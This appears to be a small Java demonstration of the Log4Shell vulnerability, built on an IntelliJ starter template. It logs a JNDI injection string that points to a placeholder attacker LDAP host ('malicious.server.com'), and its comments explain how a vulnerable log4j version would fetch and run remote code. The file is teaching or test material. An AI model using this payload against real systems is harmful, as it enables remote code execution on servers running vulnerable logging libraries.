package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class Main {
    private static final Logger logger = (Logger) LogManager.getLogger(Main.class);
    static void main() {
        //TIP Press <shortcut actionId="ShowIntentionActions"/> with your caret at the highlighted text
        // to see how IntelliJ IDEA suggests fixing it.

        // --- 1. Simulation of Receiving Malicious User Input ---

        // This string contains the malicious JNDI injection payload.
        // It instructs the vulnerable logger to perform a lookup using the
        // Lightweight Directory Access Protocol (LDAP).
        // The URL 'ldap://malicious.server.com/a' is a placeholder
        // for an attacker-controlled server that hosts a malicious Java class
        // to be executed remotely.

        String maliciousUsername = "${jndi:ldap://malicious.server.com/a}";

        // --- 2. Logging the Malicious Input ---

        System.out.println("--- Starting Log4Shell Test ---");
        System.out.println("Attempting to log: " + maliciousUsername);

        // When the vulnerable log4j version (like 2.14.1) processes this log message,
        // it detects the ${...} pattern and attempts to resolve the JNDI lookup,
        // connecting to the attacker's server.
        logger.info("User login attempt with username: {}", maliciousUsername);

        System.out.println("--- Test Complete ---");
        System.out.println("If this were a real exploit, the application would now be attempting to connect to 'malicious.server.com' via LDAP.");

        for (int i = 1; i <= 5; i++) {
            //TIP Press <shortcut actionId="Debug"/> to start debugging your code. We have set one <icon src="AllIcons.Debugger.Db_set_breakpoint"/> breakpoint
            // for you, but you can always add more by pressing <shortcut actionId="ToggleLineBreakpoint"/>.

        }
    }
}
